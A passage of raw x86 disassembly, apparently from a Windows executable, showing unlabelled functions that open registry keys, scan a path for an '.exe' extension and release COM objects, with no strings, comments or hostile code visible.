  404435:	push   eax
  404436:	call   DWORD PTR ds:0x40824c
  40443c:	test   eax,eax
  40443e:	je     0x4044be
  404440:	push   0x401790
  404445:	push   edi
  404446:	lea    eax,[ebp-0x210]
  40444c:	push   eax
  40444d:	call   DWORD PTR ds:0x4081d4
  404453:	test   eax,eax
  404455:	js     0x4044be
  404457:	and    DWORD PTR [ebp-0x224],esi
  40445d:	lea    edi,[ebp-0x220]
  404463:	xor    eax,eax
  404465:	stos   DWORD PTR es:[edi],eax
  404466:	stos   DWORD PTR es:[edi],eax
  404467:	stos   DWORD PTR es:[edi],eax
  404468:	lea    eax,[ebp-0x224]
  40446e:	push   eax
  40446f:	push   ecx
  404470:	push   ecx
  404471:	lea    ecx,[ebp-0x210]
  404477:	call   0x405e2b
  40447c:	test   eax,eax
  40447e:	js     0x4044be
  404480:	mov    ecx,DWORD PTR [ebp-0x224]
  404486:	lea    edx,[ebp-0x214]
  40448c:	push   ecx
  40448d:	xor    eax,eax
  40448f:	mov    DWORD PTR [ebp-0x214],ecx
  404495:	push   ecx
  404496:	test   ecx,ecx
  404498:	push   0xffffffff
  40449a:	setne  al
  40449d:	push   eax
  40449e:	call   0x403e9e
  4044a3:	push   DWORD PTR [ebp-0x224]
  4044a9:	call   DWORD PTR ds:0x40807c
  4044af:	push   DWORD PTR [ebp-0x220]
  4044b5:	call   DWORD PTR ds:0x40807c
  4044bb:	xor    esi,esi
  4044bd:	inc    esi
  4044be:	test   ebx,ebx
  4044c0:	je     0x4044ca
  4044c2:	push   0x0
  4044c4:	call   DWORD PTR ds:0x4080a4
  4044ca:	mov    ecx,DWORD PTR [ebp-0x4]
  4044cd:	mov    eax,esi
  4044cf:	pop    edi
  4044d0:	pop    esi
  4044d1:	xor    ecx,ebp
  4044d3:	pop    ebx
  4044d4:	call   0x4063a0
  4044d9:	mov    esp,ebp
  4044db:	pop    ebp
  4044dc:	ret    
  4044dd:	int3   
  4044de:	int3   
  4044df:	int3   
  4044e0:	int3   
  4044e1:	int3   
  4044e2:	mov    edi,edi
  4044e4:	push   esi
  4044e5:	push   0x40000048
  4044ea:	xor    esi,esi
  4044ec:	call   DWORD PTR ds:0x4080b4
  4044f2:	test   eax,eax
  4044f4:	jne    0x404510
  4044f6:	push   esi
  4044f7:	push   0x4037c0
  4044fc:	push   esi
  4044fd:	push   0x3
  4044ff:	mov    edx,0x401460
  404504:	mov    ecx,0x80000002
  404509:	call   0x403148
  40450e:	mov    esi,eax
  404510:	mov    eax,esi
  404512:	pop    esi
  404513:	ret    
  404514:	int3   
  404515:	int3   
  404516:	int3   
  404517:	int3   
  404518:	int3   
  404519:	mov    edi,edi
  40451b:	push   ebp
  40451c:	mov    ebp,esp
  40451e:	sub    esp,0x228
  404524:	mov    eax,ds:0x407004
  404529:	xor    eax,ebp
  40452b:	mov    DWORD PTR [ebp-0x8],eax
  40452e:	mov    eax,DWORD PTR [ebp+0x8]
  404531:	push   ebx
  404532:	push   esi
  404533:	mov    DWORD PTR [ebp-0x228],eax
  404539:	mov    esi,ecx
  40453b:	xor    eax,eax
  40453d:	mov    DWORD PTR [ebp-0x224],edx
  404543:	push   edi
  404544:	mov    ebx,eax
  404546:	lea    eax,[ebp-0x214]
  40454c:	push   0x104
  404551:	push   eax
  404552:	mov    DWORD PTR [ebp-0x21c],ebx
  404558:	call   DWORD PTR ds:0x408250
  40455e:	test   eax,eax
  404560:	je     0x40466e
  404566:	push   0x43
  404568:	call   DWORD PTR ds:0x408150
  40456e:	mov    ecx,eax
  404570:	mov    DWORD PTR [ebp-0x218],ecx
  404576:	test   ecx,ecx
  404578:	jne    0x40466e
  40457e:	xor    edx,edx
  404580:	mov    edi,esi
  404582:	cmp    WORD PTR [esi],dx
  404585:	je     0x40459c
  404587:	movzx  eax,WORD PTR [edi]
  40458a:	cmp    eax,0x20
  40458d:	je     0x40459c
  40458f:	cmp    eax,0x2c
  404592:	je     0x40459c
  404594:	add    edi,0x2
  404597:	cmp    WORD PTR [edi],dx
  40459a:	jne    0x404587
  40459c:	cmp    WORD PTR [edi],dx
  40459f:	jne    0x4045ac
  4045a1:	xor    ecx,ecx
  4045a3:	inc    ecx
  4045a4:	mov    DWORD PTR [ebp-0x218],ecx
  4045aa:	jmp    0x4045b1
  4045ac:	xor    eax,eax
  4045ae:	mov    WORD PTR [edi],ax
  4045b1:	cmp    WORD PTR [esi],dx
  4045b4:	je     0x404663
  4045ba:	test   DWORD PTR ds:0x407500,0x4000
  4045c4:	je     0x4045db
  4045c6:	mov    ecx,esi
  4045c8:	call   0x4036b4
  4045cd:	push   ecx
  4045ce:	push   ecx
  4045cf:	mov    edx,eax
  4045d1:	mov    ecx,0x4010e8
  4045d6:	call   0x403631
  4045db:	mov    ebx,DWORD PTR [ebp-0x228]
  4045e1:	lea    eax,[ebp-0x220]
  4045e7:	push   eax
  4045e8:	push   ebx
  4045e9:	push   ecx
  4045ea:	push   ecx
  4045eb:	push   DWORD PTR [ebp-0x224]
  4045f1:	lea    eax,[ebp-0x214]
  4045f7:	xor    edx,edx
  4045f9:	push   eax
  4045fa:	mov    ecx,esi
  4045fc:	call   0x40522a
  404601:	test   eax,eax
  404603:	jns    0x404683
  404605:	push   0x4017e8
  40460a:	call   DWORD PTR ds:0x4081c8
  404610:	test   DWORD PTR ds:0x407500,0x4000
  40461a:	mov    ebx,eax
  40461c:	je     0x404634
  40461e:	mov    ecx,esi
  404620:	call   0x4036b4
  404625:	push   eax
  404626:	push   ecx
  404627:	push   ecx
  404628:	xor    edx,edx
  40462a:	mov    ecx,0x401128
  40462f:	call   0x403dbd
  404634:	test   ebx,ebx
  404636:	je     0x404655
  404638:	push   esi
  404639:	push   0x1030
  40463e:	push   0x20c
  404643:	push   0x203
  404648:	xor    eax,eax
  40464a:	push   eax
  40464b:	push   ebx
  40464c:	call   DWORD PTR ds:0x4080ec
  404652:	add    esp,0x18
  404655:	mov    ebx,DWORD PTR [ebp-0x21c]
  40465b:	mov    ecx,DWORD PTR [ebp-0x218]
  404661:	xor    edx,edx
  404663:	lea    esi,[edi+0x2]
  404666:	test   ecx,ecx
  404668:	je     0x404580
  40466e:	mov    ecx,DWORD PTR [ebp-0x8]
  404671:	mov    eax,ebx
  404673:	pop    edi
  404674:	pop    esi
  404675:	xor    ecx,ebp
  404677:	pop    ebx
  404678:	call   0x4063a0
  40467d:	mov    esp,ebp
  40467f:	pop    ebp
  404680:	ret    0x4
  404683:	mov    edx,DWORD PTR [ebp-0x220]
  404689:	mov    ecx,ebx
  40468b:	call   0x403d50
  404690:	test   DWORD PTR ds:0x407500,0x4000
  40469a:	je     0x4046be
  40469c:	mov    ecx,esi
  40469e:	call   0x4036b4
  4046a3:	push   eax
  4046a4:	push   DWORD PTR [ebp-0x220]
  4046aa:	call   DWORD PTR ds:0x4081e0
  4046b0:	push   ecx
  4046b1:	push   ecx
  4046b2:	mov    edx,eax
  4046b4:	mov    ecx,0x401128
  4046b9:	call   0x403dbd
  4046be:	push   DWORD PTR [ebp-0x220]
  4046c4:	call   DWORD PTR ds:0x40807c
  4046ca:	xor    ebx,ebx
  4046cc:	inc    ebx
  4046cd:	mov    DWORD PTR [ebp-0x21c],ebx
  4046d3:	jmp    0x40465b
  4046d5:	int3   
  4046d6:	int3   
  4046d7:	int3   
  4046d8:	int3   
  4046d9:	int3   
  4046da:	mov    edi,edi
  4046dc:	push   ebp
  4046dd:	mov    ebp,esp
  4046df:	sub    esp,0x21c
  4046e5:	mov    eax,ds:0x407004
  4046ea:	xor    eax,ebp
  4046ec:	mov    DWORD PTR [ebp-0x4],eax
  4046ef:	push   ebx
  4046f0:	push   esi
  4046f1:	push   edi
  4046f2:	xor    ebx,ebx
  4046f4:	push   0x40000047
  4046f9:	mov    esi,ebx
  4046fb:	call   DWORD PTR ds:0x4080b4
  404701:	test   eax,eax
  404703:	jne    0x40487e
  404709:	push   0x43
  40470b:	call   DWORD PTR ds:0x408150
  404711:	test   eax,eax
  404713:	jne    0x40487e
  404719:	lea    eax,[ebp-0x20c]
  40471f:	xor    edi,edi
  404721:	push   eax
  404722:	inc    edi
  404723:	push   edi
  404724:	push   ebx
  404725:	push   0x4017f8
  40472a:	push   0x80000001
  40472f:	call   DWORD PTR ds:0x408000
  404735:	test   eax,eax
  404737:	jne    0x40487e
  40473d:	push   ecx
  40473e:	lea    ecx,[ebp-0x210]
  404744:	call   0x404371
  404749:	lea    eax,[ebp-0x214]
  40474f:	mov    DWORD PTR [ebp-0x214],0x1fe
  404759:	push   eax
  40475a:	lea    eax,[ebp-0x208]
  404760:	push   eax
  404761:	lea    eax,[ebp-0x218]
  404767:	push   eax
  404768:	push   0x401864
  40476d:	push   ebx
  40476e:	push   DWORD PTR [ebp-0x20c]
  404774:	call   DWORD PTR ds:0x4080e8
  40477a:	test   eax,eax
  40477c:	jne    0x4047da
  40477e:	cmp    DWORD PTR [ebp-0x218],edi
  404784:	jne    0x4047da
  404786:	test   DWORD PTR ds:0x407500,0x4000
  404790:	je     0x4047a3
  404792:	push   ecx
  404793:	push   ecx
  404794:	mov    edx,0x401870
  404799:	mov    ecx,0x401108
  40479e:	call   0x403631
  4047a3:	push   DWORD PTR [ebp-0x210]
  4047a9:	lea    ecx,[ebp-0x208]
  4047af:	push   0x7
  4047b1:	pop    edx
  4047b2:	call   0x404519
  4047b7:	test   eax,eax
  4047b9:	je     0x4047bd
  4047bb:	mov    esi,edi
  4047bd:	test   DWORD PTR ds:0x407500,0x4000
  4047c7:	je     0x4047da
  4047c9:	push   ecx
  4047ca:	push   ecx
  4047cb:	mov    edx,0x401870
  4047d0:	mov    ecx,0x401118
  4047d5:	call   0x403631
  4047da:	lea    eax,[ebp-0x214]
  4047e0:	mov    DWORD PTR [ebp-0x214],0x1fe
  4047ea:	push   eax
  4047eb:	lea    eax,[ebp-0x208]
  4047f1:	push   eax
  4047f2:	lea    eax,[ebp-0x218]
  4047f8:	push   eax
  4047f9:	push   0x4018e4
  4047fe:	push   ebx
  4047ff:	push   DWORD PTR [ebp-0x20c]
  404805:	call   DWORD PTR ds:0x4080e8
  40480b:	test   eax,eax
  40480d:	jne    0x404867
  40480f:	cmp    DWORD PTR [ebp-0x218],edi
  404815:	jne    0x404867
  404817:	mov    ebx,0x4000
  40481c:	test   DWORD PTR ds:0x407500,ebx
  404822:	je     0x404835
  404824:	push   ecx
  404825:	push   ecx
  404826:	mov    edx,0x4018f0
  40482b:	mov    ecx,0x401108
  404830:	call   0x403631
  404835:	push   DWORD PTR [ebp-0x210]
  40483b:	mov    edx,edi
  40483d:	lea    ecx,[ebp-0x208]
  404843:	call   0x404519
  404848:	test   eax,eax
  40484a:	je     0x40484e
  40484c:	mov    esi,edi
  40484e:	test   DWORD PTR ds:0x407500,ebx
  404854:	je     0x404867
  404856:	push   ecx
  404857:	push   ecx
  404858:	mov    edx,0x4018f0
  40485d:	mov    ecx,0x401118
  404862:	call   0x403631
  404867:	push   DWORD PTR [ebp-0x20c]
  40486d:	call   DWORD PTR ds:0x408008
  404873:	lea    ecx,[ebp-0x210]
  404879:	call   0x404b6d
  40487e:	mov    ecx,DWORD PTR [ebp-0x4]
  404881:	mov    eax,esi
  404883:	pop    edi
  404884:	pop    esi
  404885:	xor    ecx,ebp
  404887:	pop    ebx
  404888:	call   0x4063a0
  40488d:	mov    esp,ebp
  40488f:	pop    ebp
  404890:	ret    
  404891:	int3   
  404892:	int3   
  404893:	int3   
  404894:	int3   
  404895:	int3   
  404896:	mov    edi,edi
  404898:	push   ebp
  404899:	mov    ebp,esp
  40489b:	sub    esp,0x29c
  4048a1:	mov    eax,ds:0x407004
  4048a6:	xor    eax,ebp
  4048a8:	mov    DWORD PTR [ebp-0x4],eax
  4048ab:	push   ebx
  4048ac:	push   esi
  4048ad:	push   edi
  4048ae:	push   ecx
  4048af:	mov    edx,0x104
  4048b4:	lea    ecx,[ebp-0x210]
  4048ba:	call   0x4035c0
  4048bf:	lea    eax,[ebp-0x210]
  4048c5:	push   eax
  4048c6:	call   DWORD PTR ds:0x408230
  4048cc:	cmp    WORD PTR [ebp-0x210],0x0
  4048d4:	lea    esi,[ebp-0x210]
  4048da:	mov    edi,0x401964
  4048df:	je     0x40492c
  4048e1:	push   0x65
  4048e3:	pop    ebx
  4048e4:	cmp    WORD PTR [esi],0x2e
  4048e8:	jne    0x40490c
  4048ea:	cmp    WORD PTR [esi+0x2],bx
  4048ee:	jne    0x40490c
  4048f0:	cmp    WORD PTR [esi+0x4],0x78
  4048f5:	jne    0x40490c
  4048f7:	cmp    WORD PTR [esi+0x6],bx
  4048fb:	jne    0x40490c
  4048fd:	movzx  eax,WORD PTR [esi+0x8]
  404901:	push   eax
  404902:	call   DWORD PTR ds:0x40822c
  404908:	test   eax,eax
  40490a:	je     0x404917
  40490c:	add    esi,0x2
  40490f:	cmp    WORD PTR [esi],0x0
  404913:	jne    0x4048e4
  404915:	jmp    0x40492c
  404917:	xor    eax,eax
  404919:	mov    WORD PTR [esi+0x8],ax
  40491d:	lea    eax,[ebp-0x210]
  404923:	push   eax
  404924:	call   DWORD PTR ds:0x4080e4
  40492a:	mov    edi,eax
  40492c:	mov    edx,edi
  40492e:	lea    ecx,[ebp-0x298]
  404934:	call   0x40412b
  404939:	push   0x1
  40493b:	lea    eax,[ebp-0x298]
  404941:	mov    edx,0x2019
  404946:	push   eax
  404947:	mov    ecx,0x401188
  40494c:	call   0x404170
  404951:	mov    ecx,DWORD PTR [ebp-0x4]
  404954:	pop    edi
  404955:	pop    esi
  404956:	xor    ecx,ebp
  404958:	pop    ebx
  404959:	call   0x4063a0
  40495e:	mov    esp,ebp
  404960:	pop    ebp
  404961:	ret    
  404962:	int3   
  404963:	int3   
  404964:	int3   
  404965:	int3   
  404966:	int3   
  404967:	int3   
  404968:	int3   
  404969:	int3   
  40496a:	int3   
  40496b:	int3   
  40496c:	int3   
  40496d:	int3   
  40496e:	int3   
  40496f:	int3   
  404970:	mov    edi,edi
  404972:	push   ebp
  404973:	mov    ebp,esp
  404975:	push   ecx
  404976:	push   esi
  404977:	push   0x0
  404979:	push   DWORD PTR [ebp+0x18]
  40497c:	push   DWORD PTR [ebp+0x14]
  40497f:	push   DWORD PTR [ebp+0x10]
  404982:	push   DWORD PTR [ebp+0xc]
  404985:	push   DWORD PTR [ebp+0x8]
  404988:	call   0x4037c0
  40498d:	mov    edx,DWORD PTR [ebp+0x1c]
  404990:	mov    esi,eax
  404992:	test   edx,edx
  404994:	je     0x4049a7
  404996:	inc    DWORD PTR [edx]
  404998:	test   esi,esi
  40499a:	jns    0x4049a7
  40499c:	mov    ecx,DWORD PTR [ebp+0x10]
  40499f:	inc    DWORD PTR [edx+0x4]
  4049a2:	call   0x404896
  4049a7:	mov    eax,esi
  4049a9:	pop    esi
  4049aa:	pop    ecx
  4049ab:	pop    ebp
  4049ac:	ret    0x18
  4049af:	int3   
  4049b0:	int3   
  4049b1:	int3   
  4049b2:	int3   
  4049b3:	int3   
  4049b4:	mov    edi,edi
  4049b6:	push   ebp
  4049b7:	mov    ebp,esp
  4049b9:	sub    esp,0x10c
  4049bf:	mov    eax,ds:0x407004
  4049c4:	xor    eax,ebp
  4049c6:	mov    DWORD PTR [ebp-0x4],eax
  4049c9:	push   esi
  4049ca:	push   edi
  4049cb:	push   0x104
  4049d0:	lea    eax,[ebp-0x108]
  4049d6:	mov    edi,edx
  4049d8:	push   0x0
  4049da:	push   eax
  4049db:	mov    esi,ecx
  4049dd:	call   0x406aee
  4049e2:	add    esp,0xc
  4049e5:	mov    DWORD PTR [ebp-0x108],esi
  4049eb:	xor    eax,eax
  4049ed:	mov    DWORD PTR [ebp-0x84],edi
  4049f3:	inc    eax
  4049f4:	mov    edx,0x201a
  4049f9:	mov    DWORD PTR [ebp-0x10c],eax
  4049ff:	mov    ecx,0x4011e0
  404a04:	mov    DWORD PTR [ebp-0x88],eax
  404a0a:	lea    eax,[ebp-0x10c]
  404a10:	push   0x2
  404a12:	push   eax
  404a13:	call   0x404170
  404a18:	mov    ecx,DWORD PTR [ebp-0x4]
  404a1b:	pop    edi
  404a1c:	xor    ecx,ebp
  404a1e:	pop    esi
  404a1f:	call   0x4063a0
  404a24:	mov    esp,ebp
  404a26:	pop    ebp
  404a27:	ret    
  404a28:	int3   
  404a29:	int3   
  404a2a:	int3   
  404a2b:	int3   
  404a2c:	int3   
  404a2d:	mov    edi,edi
  404a2f:	push   ebp
  404a30:	mov    ebp,esp
  404a32:	push   ecx
  404a33:	push   ecx
  404a34:	push   ebx
  404a35:	push   esi
  404a36:	push   edi
  404a37:	mov    esi,ecx
  404a39:	mov    edi,edx
  404a3b:	push   ecx
  404a3c:	lea    ecx,[ebp-0x4]
  404a3f:	call   0x404371
  404a44:	xor    ebx,ebx
  404a46:	test   edi,edi
  404a48:	jle    0x404a88
  404a4a:	add    esi,0xc
  404a4d:	push   DWORD PTR [esi-0xc]
  404a50:	call   DWORD PTR ds:0x4080b4
  404a56:	test   eax,eax
  404a58:	jne    0x404a80
  404a5a:	push   DWORD PTR [esi+0x4]
  404a5d:	mov    edx,DWORD PTR [esi-0x8]
  404a60:	xor    ecx,ecx
  404a62:	call   0x403cde
  404a67:	mov    edx,DWORD PTR [esi-0x4]
  404a6a:	mov    ecx,DWORD PTR [esi-0x8]
  404a6d:	push   0x0
  404a6f:	push   0x404970
  404a74:	push   DWORD PTR [ebp-0x4]
  404a77:	push   DWORD PTR [esi]
  404a79:	call   0x403148
  404a7e:	mov    ebx,eax
  404a80:	add    esi,0x14
  404a83:	sub    edi,0x1
  404a86:	jne    0x404a4d
  404a88:	lea    ecx,[ebp-0x4]
  404a8b:	call   0x404b6d
  404a90:	pop    edi
  404a91:	pop    esi
  404a92:	mov    eax,ebx
  404a94:	pop    ebx
  404a95:	mov    esp,ebp
  404a97:	pop    ebp
  404a98:	ret    0x4
  404a9b:	int3   
  404a9c:	int3   
  404a9d:	int3   
  404a9e:	int3   
  404a9f:	int3   
  404aa0:	mov    edi,edi
  404aa2:	push   ebp
  404aa3:	mov    ebp,esp
  404aa5:	sub    esp,0x10
  404aa8:	push   ebx
  404aa9:	push   esi
  404aaa:	push   ecx
  404aab:	lea    ecx,[ebp-0x4]
  404aae:	call   0x404371
  404ab3:	mov    ecx,DWORD PTR [ebp-0x4]
  404ab6:	mov    esi,0x80000002
  404abb:	push   0x401968
  404ac0:	mov    edx,esi
  404ac2:	call   0x403cde
  404ac7:	and    DWORD PTR [ebp-0xc],0x0
  404acb:	and    DWORD PTR [ebp-0x8],0x0
  404acf:	push   0x4011e0
  404ad4:	push   DWORD PTR ds:0x4074d4
  404ada:	push   DWORD PTR ds:0x4074d0
  404ae0:	call   DWORD PTR ds:0x408274
  404ae6:	mov    bl,al
  404ae8:	mov    ecx,esi
  404aea:	movzx  edx,bl
  404aed:	lea    eax,[ebp-0xc]
  404af0:	neg    edx
  404af2:	sbb    edx,edx
  404af4:	and    edx,eax
  404af6:	push   edx
  404af7:	push   0x404970
  404afc:	push   DWORD PTR [ebp-0x4]
  404aff:	mov    edx,0x401978
  404b04:	push   0x48
  404b06:	call   0x403148
  404b0b:	mov    esi,eax
  404b0d:	test   bl,bl
  404b0f:	je     0x404b28
  404b11:	mov    ecx,DWORD PTR [ebp-0xc]
  404b14:	test   ecx,ecx
  404b16:	jne    0x404b20
  404b18:	xor    edx,edx
  404b1a:	inc    edx
  404b1b:	mov    DWORD PTR [ebp-0x8],edx
  404b1e:	jmp    0x404b23
  404b20:	mov    edx,DWORD PTR [ebp-0x8]
  404b23:	call   0x4049b4
  404b28:	lea    ecx,[ebp-0x4]
  404b2b:	call   0x404b6d
  404b30:	mov    eax,esi
  404b32:	pop    esi
  404b33:	pop    ebx
  404b34:	mov    esp,ebp
  404b36:	pop    ebp
  404b37:	ret    
  404b38:	int3   
  404b39:	int3   
  404b3a:	int3   
  404b3b:	int3   
  404b3c:	int3   
  404b3d:	mov    edi,edi
  404b3f:	push   ecx
  404b40:	push   ecx
  404b41:	push   0x4
  404b43:	pop    edx
  404b44:	mov    ecx,0x401a70
  404b49:	call   0x404a2d
  404b4e:	pop    ecx
  404b4f:	ret    
  404b50:	int3   
  404b51:	int3   
  404b52:	int3   
  404b53:	int3   
  404b54:	int3   
  404b55:	mov    edi,edi
  404b57:	push   ecx
  404b58:	xor    edx,edx
  404b5a:	push   ecx
  404b5b:	inc    edx
  404b5c:	mov    ecx,0x401a58
  404b61:	call   0x404a2d
  404b66:	pop    ecx
  404b67:	ret    
  404b68:	int3   
  404b69:	int3   
  404b6a:	int3   
  404b6b:	int3   
  404b6c:	int3   
  404b6d:	mov    edi,edi
  404b6f:	push   ebp
  404b70:	mov    ebp,esp
  404b72:	push   ecx
  404b73:	mov    eax,ds:0x407004
  404b78:	xor    eax,ebp
  404b7a:	mov    DWORD PTR [ebp-0x4],eax
  404b7d:	mov    edx,DWORD PTR [ecx]
  404b7f:	and    DWORD PTR [ecx],0x0
  404b82:	test   edx,edx
  404b84:	je     0x404b98
  404b86:	mov    eax,DWORD PTR [edx]
  404b88:	push   esi
  404b89:	push   edx
  404b8a:	mov    esi,DWORD PTR [eax+0x8]
  404b8d:	mov    ecx,esi
  404b8f:	call   DWORD PTR ds:0x4082f0
  404b95:	call   esi
  404b97:	pop    esi
  404b98:	mov    ecx,DWORD PTR [ebp-0x4]
  404b9b:	xor    ecx,ebp
  404b9d:	call   0x4063a0
  404ba2:	mov    esp,ebp
  404ba4:	pop    ebp
  404ba5:	ret    
  404ba6:	int3   
  404ba7:	int3   
  404ba8:	int3   
  404ba9:	int3   
  404baa:	int3   
  404bab:	mov    edi,edi
  404bad:	push   ebp
  404bae:	mov    ebp,esp
  404bb0:	sub    esp,0xc
  404bb3:	push   esi
  404bb4:	xor    esi,esi
  404bb6:	inc    esi
  404bb7:	cmp    DWORD PTR ds:0x407508,0x0
  404bbe:	jne    0x404c1e
  404bc0:	push   edi
  404bc1:	lea    eax,[ebp-0x4]
  404bc4:	mov    DWORD PTR ds:0x407508,esi
  404bca:	push   eax
  404bcb:	mov    edi,0x20006
  404bd0:	push   edi
  404bd1:	call   DWORD PTR ds:0x4080b8
  404bd7:	test   eax,eax
  404bd9:	js     0x404c1d
  404bdb:	lea    eax,[ebp-0xc]
  404bde:	push   eax
  404bdf:	lea    eax,[ebp-0x8]
  404be2:	push   eax
  404be3:	xor    eax,eax
  404be5:	push   eax
  404be6:	push   edi
  404be7:	push   esi
  404be8:	push   eax
  404be9:	push   eax
  404bea:	push   0x401ad0
  404bef:	push   DWORD PTR [ebp-0x4]
  404bf2:	call   DWORD PTR ds:0x408214
  404bf8:	test   eax,eax
  404bfa:	jne    0x404c14
  404bfc:	push   DWORD PTR [ebp-0x8]
  404bff:	call   DWORD PTR ds:0x408008
  404c05:	cmp    DWORD PTR [ebp-0xc],esi
  404c08:	jne    0x404c14
  404c0a:	mov    DWORD PTR ds:0x407508,0x2
  404c14:	push   DWORD PTR [ebp-0x4]
  404c17:	call   DWORD PTR ds:0x408008
  404c1d:	pop    edi
  404c1e:	xor    eax,eax
  404c20:	cmp    DWORD PTR ds:0x407508,esi
  404c26:	pop    esi
  404c27:	sete   al
  404c2a:	mov    esp,ebp
  404c2c:	pop    ebp
  404c2d:	ret    
  404c2e:	int3   
  404c2f:	int3   
  404c30:	int3   
  404c31:	int3   
  404c32:	int3   
  404c33:	mov    edi,edi
  404c35:	push   ebp
  404c36:	mov    ebp,esp
  404c38:	push   ecx
  404c39:	push   ecx
  404c3a:	push   ebx
  404c3b:	lea    eax,[ebp-0x4]
  404c3e:	xor    ebx,ebx
  404c40:	push   eax
  404c41:	push   0x9
  404c43:	push   ebx
  404c44:	push   0x401728
  404c49:	push   0x80000002
  404c4e:	call   DWORD PTR ds:0x408000
  404c54:	test   eax,eax
  404c56:	jne    0x404c82
  404c58:	push   ebx
  404c59:	push   ebx
  404c5a:	push   ebx
  404c5b:	push   ebx
  404c5c:	push   ebx
  404c5d:	push   ebx
  404c5e:	push   ebx
  404c5f:	lea    eax,[ebp-0x8]
  404c62:	push   eax
  404c63:	push   ebx
  404c64:	push   ebx
  404c65:	push   ebx
  404c66:	push   DWORD PTR [ebp-0x4]
  404c69:	call   DWORD PTR ds:0x408218
  404c6f:	test   eax,eax
  404c71:	jne    0x404c79
  404c73:	cmp    DWORD PTR [ebp-0x8],ebx
  404c76:	setne  bl
  404c79:	push   DWORD PTR [ebp-0x4]
  404c7c:	call   DWORD PTR ds:0x408008
  404c82:	mov    eax,ebx
  404c84:	pop    ebx
  404c85:	mov    esp,ebp
  404c87:	pop    ebp
  404c88:	ret    0x4
  404c8b:	int3   
  404c8c:	int3   
  404c8d:	int3   
  404c8e:	int3   
  404c8f:	int3   
  404c90:	mov    edi,edi
  404c92:	push   ebp
  404c93:	mov    ebp,esp
  404c95:	sub    esp,0x49c
  404c9b:	mov    eax,ds:0x407004
  404ca0:	xor    eax,ebp
  404ca2:	mov    DWORD PTR [ebp-0x4],eax
  404ca5:	push   ebx
  404ca6:	push   esi
  404ca7:	push   edi
  404ca8:	mov    esi,0x488
  404cad:	lea    eax,[ebp-0x490]
  404cb3:	push   esi
  404cb4:	xor    ebx,ebx
  404cb6:	push   ebx
  404cb7:	push   eax
  404cb8:	call   0x406aee
  404cbd:	add    esp,0xc
  404cc0:	mov    DWORD PTR [ebp-0x490],esi
  404cc6:	mov    edi,0x104
  404ccb:	mov    DWORD PTR [ebp-0x464],0x20000
  404cd5:	lea    eax,[ebp-0x418]
  404cdb:	mov    DWORD PTR [ebp-0x460],0x8
  404ce5:	mov    DWORD PTR [ebp-0x450],0x20801
  404cef:	mov    esi,0x80004005
  404cf4:	push   edi
  404cf5:	push   eax
  404cf6:	push   DWORD PTR ds:0x401b88
  404cfc:	mov    DWORD PTR [ebp-0x424],0x78
  404d06:	mov    DWORD PTR [ebp-0x420],0x280
  404d10:	call   DWORD PTR ds:0x4080f4
  404d16:	test   eax,eax
  404d18:	je     0x404e55
  404d1e:	lea    eax,[ebp-0x418]
  404d24:	push   eax
  404d25:	push   ebx
  404d26:	call   DWORD PTR ds:0x4080bc
  404d2c:	push   0x401530
  404d31:	push   edi
  404d32:	lea    eax,[ebp-0x418]
  404d38:	push   eax
  404d39:	call   DWORD PTR ds:0x4081d4
  404d3f:	mov    esi,eax
  404d41:	test   esi,esi
  404d43:	js     0x404e55
  404d49:	push   0x401af8
  404d4e:	push   edi
  404d4f:	lea    eax,[ebp-0x418]
  404d55:	push   eax
  404d56:	call   DWORD PTR ds:0x4081d8
  404d5c:	mov    esi,eax
  404d5e:	test   esi,esi
  404d60:	js     0x404e55
  404d66:	lea    eax,[ebp-0x490]
  404d6c:	mov    DWORD PTR [ebp-0x498],ebx
  404d72:	push   eax
  404d73:	mov    edi,0x401530
  404d78:	mov    DWORD PTR [ebp-0x494],ebx
  404d7e:	push   edi
  404d7f:	lea    eax,[ebp-0x498]
  404d85:	push   eax
  404d86:	call   DWORD PTR ds:0x40826c
  404d8c:	mov    esi,eax
  404d8e:	test   esi,esi
  404d90:	jle    0x404d9b
  404d92:	movzx  esi,si
  404d95:	or     esi,0x80070000
  404d9b:	cmp    esi,0x80070057
  404da1:	jne    0x404de1
  404da3:	lea    eax,[ebp-0x418]
  404da9:	push   eax
  404daa:	call   DWORD PTR ds:0x4081a8
  404db0:	test   eax,eax
  404db2:	je     0x404dda
  404db4:	lea    eax,[ebp-0x490]
  404dba:	push   eax
  404dbb:	push   edi
  404dbc:	lea    eax,[ebp-0x498]
  404dc2:	push   eax
  404dc3:	call   DWORD PTR ds:0x40826c
  404dc9:	mov    esi,eax
  404dcb:	test   esi,esi
  404dcd:	jle    0x404de3
  404dcf:	movzx  esi,si
  404dd2:	or     esi,0x80070000
  404dd8:	jmp    0x404de1
  404dda:	call   0x4040b1
  404ddf:	mov    esi,eax
  404de1:	test   esi,esi
  404de3:	js     0x404e55
  404de5:	mov    edi,ebx
  404de7:	test   esi,esi
  404de9:	js     0x404e2e
  404deb:	mov    eax,ds:0x401b94
  404df0:	push   ebx
  404df1:	push   ebx
  404df2:	push   ebx
  404df3:	push   ebx
  404df4:	add    eax,edi
  404df6:	push   DWORD PTR [eax+0x14]
  404df9:	push   DWORD PTR [eax+0x10]
  404dfc:	push   0x4
  404dfe:	push   0x1
  404e00:	push   eax
  404e01:	push   DWORD PTR [ebp-0x494]
  404e07:	push   DWORD PTR [ebp-0x498]
  404e0d:	call   DWORD PTR ds:0x408268
  404e13:	mov    esi,eax
  404e15:	test   esi,esi
  404e17:	jle    0x404e22
  404e19:	movzx  esi,si
  404e1c:	or     esi,0x80070000
  404e22:	add    edi,0x18
  404e25:	cmp    edi,0x18
  404e28:	jb     0x404de7
  404e2a:	test   esi,esi
  404e2c:	jns    0x404e55
  404e2e:	lea    eax,[ebp-0x490]
  404e34:	push   eax
  404e35:	push   ebx
  404e36:	push   DWORD PTR [ebp-0x494]
  404e3c:	push   DWORD PTR [ebp-0x498]
  404e42:	call   DWORD PTR ds:0x408264
  404e48:	lea    eax,[ebp-0x418]
  404e4e:	push   eax
  404e4f:	call   DWORD PTR ds:0x4081a8
  404e55:	mov    ecx,DWORD PTR [ebp-0x4]
  404e58:	mov    eax,esi
  404e5a:	pop    edi
  404e5b:	pop    esi
  404e5c:	xor    ecx,ebp
  404e5e:	pop    ebx
  404e5f:	call   0x4063a0
  404e64:	mov    esp,ebp
  404e66:	pop    ebp
  404e67:	ret    
  404e68:	int3   
  404e69:	int3   
  404e6a:	int3   
  404e6b:	int3   
  404e6c:	int3   
  404e6d:	int3   
  404e6e:	int3   
  404e6f:	int3   
  404e70:	mov    edi,edi
  404e72:	push   ebp
  404e73:	mov    ebp,esp
